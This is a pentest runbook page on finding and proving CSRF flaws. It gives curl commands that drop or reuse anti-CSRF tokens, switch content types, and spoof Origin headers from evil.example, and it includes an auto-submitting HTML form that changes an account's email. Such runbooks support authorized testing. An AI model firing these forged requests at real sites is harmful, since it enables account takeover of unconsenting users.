---
title: "CSRF (Cross-Site Request Forgery)"
description: "Finding and proving CSRF: token gaps, SameSite behavior, GET-based state changes, JSON and content-type tricks, and chained impact."
phase: Web
order: 25
tags:
  - csrf
  - session
  - web
  - owasp
tools:
  - burp suite
  - browser devtools
updated: 2026-10-01
---

A CSRF runbook for authorized pentests / bug bounty on **in-scope** targets only. Goal: find a stable state-changing request that lacks an unguessable, session-bound token, then build a working forged request against an account you control.

## 1. Map state-changing requests

Intercept and list every write: password/email change, transfers, API key creation, role changes, account deletion.

```bash
# Capture the request and its anti-CSRF artifacts
curl -s -c jar.txt "https://target.com/settings" -o settings.html
grep -ioE 'name="[^"]*token[^"]*"|authenticity_token|x-csrf-token|csrfmiddlewaretoken' settings.html

# See whether the cookie is SameSite
curl -s -I -c jar.txt "https://target.com/settings" | grep -i set-cookie
```

## 2. Test the token's strength

Look for token presence, verification, and whether it is tied to the user session.

```bash
# Remove the token entirely
curl -s -b "session=YOURTOKEN" -X POST "https://target.com/api/email" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "email=attacker@example.com"

# Reuse a token from a different session (should fail if bound)
curl -s -b "session=YOURTOKEN" -X POST "https://target.com/api/email" \
  --data "email=attacker@example.com&csrf=OTHER_SESSION_TOKEN"

# Try an empty or fixed value
curl -s -b "session=YOURTOKEN" -X POST "https://target.com/api/email" \
  --data "email=attacker@example.com&csrf="
```

## 3. Explore method and content-type tricks

If JSON or custom headers are required, check whether the server still parses form-encoded or `text/plain` bodies.

```bash
# Form-encoded against a JSON endpoint
curl -s -b "session=YOURTOKEN" -X POST "https://target.com/api/email" \
  -H "Content-Type: application/x-www-form-urlencoded" --data "email=attacker@example.com"

# text/plain with a JSON body
curl -s -b "session=YOURTOKEN" -X POST "https://target.com/api/email" \
  -H "Content-Type: text/plain" --data '{"email":"attacker@example.com"}'

# Check whether GET also changes state
curl -s -b "session=YOURTOKEN" "https://target.com/api/email?email=attacker@example.com"
```

## 4. Verify SameSite behavior

```bash
# None/Lax cookies flow on cross-site POST/GET
curl -sI "https://target.com/" | grep -io "samesite=[a-z]*"

# Simulate a cross-site request with the CSRF token omitted
curl -s -b "session=YOURTOKEN" -X POST "https://target.com/api/email" \
  -H "Origin: https://evil.example" \
  -H "Referer: https://evil.example/" \
  --data "email=attacker@example.com"
```

If the server does not validate `Origin`/`Referer` and the cookie is `SameSite=Lax` or `None`, a top-level cross-site form can succeed.

## 5. Build the PoC

```bash
cat > csrf_poc.html <<'EOF'
<form action="https://target.com/api/email" method="POST" id="f">
  <input name="email" value="attacker@example.com">
</form>
<script>document.getElementById('f').submit();</script>
EOF

# JSON variant via fetch (needs permissive CORS/CT)
python3 -m http.server 8000
```

## 6. Sweep with xsrfprobe

```bash
xsrfprobe -u https://target.com/settings --cookies "session=YOURTOKEN"
xsrfprobe -u https://target.com/settings --cookies "session=YOURTOKEN" --verbose
```

## Full pipeline

```bash
# 1. Map the target request and token
curl -s -c jar.txt "https://target.com/settings" -o settings.html
grep -ioE 'name="[^"]*token[^"]*"|chrome|x-csrf-token' settings.html
curl -sI -c jar.txt "https://target.com/settings" | grep -i set-cookie

# 2. Token strength tests
curl -s -b "session=YOURTOKEN" -X POST "https://target.com/api/email" --data "email=attacker@example.com"
curl -s -b "session=YOURTOKEN" -X POST "https://target.com/api/email" --data "email=attacker@example.com&csrf="

# 3. Content-type and method tricks
curl -s -b "session=YOURTOKEN" -X POST "https://target.com/api/email" -H "Content-Type: text/plain" --data '{"email":"attacker@example.com"}'
curl -s -b "session=YOURTOKEN" "https://target.com/api/email?email=attacker@example.com"

# 4. Origin/Referer trust
curl -s -b "session=YOURTOKEN" -X POST "https://target.com/api/email" -H "Origin: https://evil.example" --data "email=attacker@example.com"

# 5. PoC and automation
python3 -m http.server 8000
xsrfprobe -u https://target.com/settings --cookies "session=YOURTOKEN" --verbose
```

## Ethics & legality

- Perform all tests against accounts you own within the authorized scope.
- Never forge actions on other users' accounts or cause real-world impact.
- Use a benign target value (e.g., a mailbox you control) in PoCs.
- Capture the full request/response and browser reproduction steps as evidence.
